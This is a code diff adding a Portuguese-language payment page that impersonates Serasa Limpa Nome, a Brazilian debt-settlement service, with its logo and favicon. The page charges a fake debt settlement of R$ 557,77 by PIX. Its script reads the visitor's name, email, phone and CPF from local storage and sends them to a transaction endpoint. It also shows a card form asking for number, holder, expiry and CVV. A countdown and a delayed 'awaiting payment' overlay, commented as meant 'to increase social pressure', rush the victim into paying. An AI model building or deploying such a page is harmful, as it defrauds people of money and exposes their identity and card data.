@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento Seguro - Serasa Limpa Nome</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="shortcut icon" href="https://www.serasa.com.br/favicon.ico" type="image/x-icon">
+    <script src="protection.js"></script>
+    <style>
+        .checkout-container {
+            max-width: 600px;
+            margin: 40px auto;
+        }
+
+        .payment-methods {
+            display: grid;
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .method-card {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            border: 2px solid #eee;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .method-card.active {
+            border-color: var(--primary-color);
+            background: #fff0f6;
+        }
+
+        .method-icon {
+            width: 40px;
+            height: 40px;
+            background: #f5f7fa;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+        }
+
+        .method-info h4 {
+            margin-bottom: 2px;
+        }
+
+        .method-info p {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        .pix-area {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: var(--shadow);
+            display: none;
+        }
+
+        .pix-area.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            background: #eee;
+            margin: 20px auto;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .qr-code img {
+            max-width: 90%;
+        }
+
+        .copy-box {
+            background: #f5f7fa;
+            padding: 15px;
+            border-radius: 8px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 0.8rem;
+            margin: 20px 0;
+            border: 1px dashed #ccc;
+            cursor: pointer;
+        }
+
+        .method-badge {
+            background: #25d366;
+            color: white;
+            font-size: 0.65rem;
+            font-weight: 800;
+            padding: 4px 8px;
+            border-radius: 4px;
+            margin-left: auto;
+        }
+
+        .pix-timer {
+            background: #fff3cd;
+            color: #856404;
+            padding: 8px;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+
+        .qr-code-wrapper {
+            position: relative;
+            width: 220px;
+            margin: 0 auto 20px;
+        }
+
+        .qr-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--secondary-color);
+            border-radius: 10px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .qr-overlay.active {
+            opacity: 1;
+        }
+
+        .copy-instruction {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 10px;
+        }
+
+        .btn-pulse {
+            animation: btnPulse 2s infinite;
+        }
+
+        @keyframes btnPulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.02);
+                box-shadow: 0 0 20px rgba(230, 56, 136, 0.4);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .card-form {
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .input-with-icon {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-with-icon img {
+            position: absolute;
+            right: 15px;
+        }
+
+        .secure-footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            opacity: 0.7;
+        }
+    </style>
+</head>
+
+<body class="bg-light">
+    <header class="acordo-header">
+        <div class="container text-center">
+            <svg viewBox="0 0 1024 1024" width="120" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#E63888"
+                    d="M623.83 240.949h-118.542c-35.291 0-63.817-27.989-63.817-62.456v-116.072c0-34.467 28.526-62.421 63.817-62.421h118.542c35.183 0 63.745 27.953 63.745 62.421v116.072c0 34.467-28.562 62.456-63.745 62.456zM317.203 501.083h-133.324c-39.621 0-71.762-31.354-71.762-70.223v-130.568c0-38.798 32.141-70.295 71.762-70.295h133.324c39.621 0 71.762 31.497 71.762 70.295v130.568c0 38.87-32.141 70.223-71.762 70.223zM304.497 772.061h-81.462c-0.129 0.001-0.28 0.002-0.432 0.002-23.815 0-43.151-19.174-43.413-42.928v-79.697c0-23.801 19.685-43.022 43.845-43.022h81.462c24.195 0 43.881 19.22 43.881 43.022v79.672c0 23.766-19.685 42.95-43.881 42.95zM523.148 1023.999h-96.28c-28.633 0-51.826-22.62-51.826-50.717v-94.275c0-28.061 23.193-50.753 51.826-50.753h96.28c28.633 0 51.826 22.692 51.826 50.753v94.275c0 28.096-23.193 50.717-51.826 50.717zM876.018 288.408h-66.716c-0.096 0.001-0.21 0.001-0.324 0.001-19.479 0-35.297-15.669-35.538-35.090v-65.271c0.201-19.455 16.020-35.15 35.503-35.15 0.126 0 0.253 0.001 0.379 0.002h66.697c0.107-0.001 0.234-0.002 0.36-0.002 19.484 0 35.302 15.694 35.503 35.131v65.267c0 19.328-16.035 35.112-35.863 35.112zM653.287 554.305c-23.551-12.634-47.71-24.231-71.082-37.080-10.034-5.403-18.671-11.758-26.304-19.143l0.032 0.030c-17.967-17.86-15.033-44.060 5.941-55.62 6.196-3.272 13.419-5.585 21.066-6.52l0.302-0.030c21.761-2.863 41.626 2.792 60.667 13.386 9.485 5.333 20.258 9.27 30.96 11.489 11.167 2.291 21.010-2.756 27.918-11.883 3.262-4.013 5.237-9.185 5.237-14.82 0-4.958-1.53-9.559-4.143-13.357l0.051 0.079c-4.719-7.554-10.529-13.935-17.296-19.131l-0.17-0.125c-26.557-19.542-57.195-27.703-90.088-28.633-24.088 0.394-47.066 5.261-68.362 16.858-45.813 25.018-63.709 73.48-44.024 120.725 9.628 22.978 27.202 39.335 48.82 51.218 19.077 10.487 38.941 19.578 58.484 29.242 16.357 8.125 32.284 16.894 45.098 30.065 15.856 16.214 19.184 34.718 8.769 49.929-7.838 11.382-19.685 16.285-33 18.433-26.235 4.152-50.108-2.362-72.442-15.82-7.731-4.653-15.641-9.521-24.052-12.634-24.195-8.948-46.637 8.375-42.091 32.069 2.076 10.559 8.876 18.361 16.929 25.162 41.948 35.505 118.113 44.382 168.543 19.685 54.224-26.557 73.122-83.359 45.205-136.223-11.31-21.511-29.85-35.935-50.967-47.352zM771.006 750.515c-0.032 0.001-0.070 0.001-0.108 0.001-2.216 0-4.020-1.767-4.079-3.968v-41.882h-9.556c0 0 0 0-0.001 0-2.234 0-4.044-1.811-4.044-4.044 0-0.026 0-0.050 0.001-0.075v0.003c0-2.362 1.718-4.116 4.044-4.116h27.667c2.291 0 4.044 1.79 4.044 4.116 0 2.291-1.79 4.080-4.044 4.080h-9.7v41.876c0 2.291-1.79 4.009-4.223 4.009zM820.47 750.586c-2.255 0-3.579-1.646-4.116-3.221l-11.919-34.217v33.394c0 2.291-1.79 3.973-4.152 3.973-0.032 0.001-0.072 0.001-0.11 0.001-2.224 0-4.036-1.763-4.114-3.967v-44.209c0.135-3.401 2.888-6.116 6.293-6.192h0.007c2.684 0 5.19 1.897 6.085 4.546l12.062 34.611 11.954-34.611c0.87-2.617 3.269-4.482 6.113-4.546h0.008c3.411 0.076 6.164 2.791 6.299 6.18v44.215c0 2.291-1.79 3.973-4.223 3.973-0.021 0-0.047 0.001-0.073 0.001-2.216 0-4.019-1.766-4.079-3.968v-33.328c5.243-18.401 1.231-7.060-2.735 4.304l-9.077 29.877c-0.966 2.076-2.398 3.221-4.188 3.221z" />
+            </svg>
+            <h3 class="mt-2" style="color: var(--secondary-color)">Finalizar Regularização de CPF</h3>
+        </div>
+    </header>
+
+    <main class="container checkout-container">
+        <div class="card p-4">
+            <div class="text-center mb-4">
+                <p class="text-muted">Total a pagar:</p>
+                <h2 style="font-size: 2.5rem; color: var(--secondary-color);">R$ 557,77</h2>
+            </div>
+
+            <div class="payment-methods">
+                <div class="method-card active" onclick="selectMethod('pix')">
+                    <div class="method-icon">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path
+                                d="M12 2L2 12L12 22L22 12L12 2ZM11 16H9V14H11V16ZM11 12H9V8H11V12ZM15 16H13V14H15V16ZM15 12H13V8H15V12Z"
+                                fill="#32BCAD" />
+                        </svg>
+                    </div>
+                    <div class="method-info">
+                        <h4>PIX Automático</h4>
+                        <p>Liberação imediata das restrições e atualização do score no sistema.</p>
+                    </div>
+                    <div class="method-badge">RECOMENDADO</div>
+                </div>
+                <div class="method-card" onclick="selectMethod('card')">
+                    <div class="method-icon">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="2" y="5" width="20" height="14" rx="2" stroke="#2D3277" stroke-width="2" />
+                            <path d="M2 10H22" stroke="#2D3277" stroke-width="2" />
+                        </svg>
+                    </div>
+                    <div class="method-info">
+                        <h4>Cartão de Crédito</h4>
+                        <p>Regularize seu débito em até 12x com baixa garantida.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="pix-area" class="pix-area active">
+                <div class="pix-timer">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align: middle; margin-right: 4px;"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                    Esta chave expira em <span>05:00</span>
+                </div>
+                <div class="qr-code-wrapper">
+                    <div class="qr-code">
+                        <img src="" alt="QR Code PIX">
+                    </div>
+                    <div class="qr-overlay">
+                        <span>Aguardando Pagamento...</span>
+                    </div>
+                </div>
+                <p class="copy-instruction">Clique abaixo para copiar o código PIX:</p>
+                <div class="copy-box" onclick="copyPix()">
+                    Gerando código...
+                </div>
+                <button class="btn-primary btn-pulse" onclick="window.location.href='comprovante.html'">
+                    CONFIRMAR PAGAMENTO AGORA
+                </button>
+            </div>
+
+            <div id="card-area" class="pix-area">
+                <div class="card-form">
+                    <div class="form-group">
+                        <label>Número do Cartão</label>
+                        <div class="input-with-icon">
+                            <input type="text" placeholder="0000 0000 0000 0000" id="card-number">
+                            <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" style="height: 20px;">
+                        </div>
+                    </div>
+                    <div style="display: flex; gap: 15px;">
+                        <div class="form-group" style="flex: 2;">
+                            <label>Titular do Cartão</label>
+                            <input type="text" placeholder="NOME IMPRESSO NO CARTÃO">
+                        </div>
+                        <div class="form-group" style="flex: 1;">
+                            <label>Validade</label>
+                            <input type="text" placeholder="MM/AA">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="password" placeholder="***" maxlength="3">
+                    </div>
+                    <button class="btn-primary">PROCESSAR PAGAMENTO SEGURO</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="secure-footer">
+            <span>🔒 Pagamento 100% Seguro</span>
+            <span>🛡️ Criptografia SSL</span>
+        </div>
+    </main>
+
+    <script>
+        const userData = JSON.parse(localStorage.getItem('user_data') || '{}');
+        const discountedVal = parseFloat(localStorage.getItem('debt_discounted') || 557.77);
+        const amountCents = Math.round(discountedVal * 100);
+
+        document.querySelector('h2[style*="font-size: 2.5rem"]').textContent =
+            discountedVal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+        async function generatePix() {
+            const pixArea = document.getElementById('pix-area');
+            const qrImg = pixArea.querySelector('.qr-code img');
+            const copyBox = pixArea.querySelector('.copy-box');
+            const btn = pixArea.querySelector('.btn-primary');
+            const qrOverlay = document.querySelector('.qr-overlay');
+
+            // Show loading state
+            qrImg.src = 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZ3R6Z3R6Z3R6Z3R6Z3R6Z3R6Z3R6Z3R6Z3R6Z3R6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7bu3XilJ5BOiSGic/giphy.gif';
+            copyBox.textContent = 'Gerando código PIX...';
+            btn.disabled = true;
+
+            try {
+                const response = await fetch('/api/create-transaction', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        amount: amountCents,
+                        customer: {
+                            name: userData.NOME || 'Cliente Serasa',
+                            email: userData.EMAIL || 'contato@exemplo.com',
+                            phone: userData.TELEFONE || '11999999999',
+                            document: {
+                                number: userData.CPF || userData.DOCUMENTO || '00000000000',
+                                type: 'CPF'
+                            }
+                        },
+                        items: [{
+                            title: 'Acordo Serasa Limpa Nome',
+                            unit_price: amountCents,
+                            quantity: 1,
+                            tangible: false
+                        }]
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.pix) {
+                    qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pix.copy_paste)}`;
+                    copyBox.textContent = data.pix.copy_paste;
+                    btn.disabled = false;
+
+                    // Show status overlay after 10 seconds to increase social pressure
+                    setTimeout(() => {
+                        qrOverlay.classList.add('active');
+                    }, 10000);
+
+                    startTimer(300); // 5 minutes
+
+                    localStorage.setItem('current_transaction_id', data.id);
+                } else {
+                    throw new Error('Falha ao gerar PIX');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                copyBox.textContent = 'Erro ao gerar PIX. Tente novamente.';
+                qrImg.src = '';
+                qrImg.alt = 'Erro ao carregar';
+            }
+        }
+
+        function startTimer(duration) {
+            let timer = duration, minutes, seconds;
+            const display = document.querySelector('.pix-timer span');
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    display.textContent = "EXPIRADO";
+                }
+            }, 1000);
+        }
+
+        // Initialize PIX generation
+        generatePix();
+
+        function selectMethod(method) {
+            document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
+            document.querySelectorAll('.pix-area').forEach(a => a.classList.remove('active'));
+
+            if (method === 'pix') {
+                document.querySelector('.method-card:nth-child(1)').classList.add('active');
+                document.getElementById('pix-area').classList.add('active');
+            } else {
+                document.querySelector('.method-card:nth-child(2)').classList.add('active');
+                document.getElementById('card-area').classList.add('active');
+            }
+        }
+
+        function copyPix() {
+            const text = document.querySelector('.copy-box').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Código PIX copiado com sucesso!');
+            });
+        }
+    </script>
+</body>
+
+</html>
